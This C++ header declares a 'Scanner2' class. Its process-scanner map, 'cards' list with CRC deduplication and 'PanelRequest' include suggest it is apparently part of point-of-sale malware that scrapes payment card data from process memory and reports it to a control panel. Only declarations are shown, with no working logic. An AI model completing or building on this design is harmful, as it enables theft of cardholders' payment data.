#pragma once
#include <Windows.h>
#include "Settings.h"
#include "ProcScanner.h"
#include "PanelRequest.h"

#include <map>



class Scanner2
{
public:
	Scanner2();
	~Scanner2(void);

	void scan();
	bool found(std::string& card, ProcScanner* p);

	void procDone(ProcScanner* p);

	void crc32(unsigned char* block, unsigned int length);

	static Scanner2* instance();
private:
	std::map<DWORD, ProcScanner*> procs;
	CRITICAL_SECTION cp;

	std::vector<std::string> cards;
	std::set<DWORD> cardcrc;
	CRITICAL_SECTION cc;

	DWORD crc_tab[256];
	void crc32gentab();

};



